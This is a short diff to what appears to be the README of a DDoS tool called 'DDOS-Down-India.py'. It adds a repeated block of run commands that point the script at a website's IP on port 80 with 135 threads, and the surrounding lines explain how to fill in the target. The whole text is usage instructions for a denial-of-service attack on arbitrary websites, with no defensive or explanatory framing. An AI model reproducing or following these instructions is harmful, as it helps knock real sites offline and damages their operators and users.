@@ -22,6 +22,13 @@ cd DDOS
 python DDOS-Down-India.py -s (IP) -t 135 -p 80
 python3 DDOS-Down-India.py -s (IP) -t 135 -p 80
 ```
+# 2nd Time Run
+```
+cd
+cd DDOS
+python DDOS-Down-India.py -s (IP) -t 135 -p 80
+python3 DDOS-Down-India.py -s (IP) -t 135 -p 80
+```
 (IP) = Remove () Or Enter Website IP
 
 # How To Find IP?
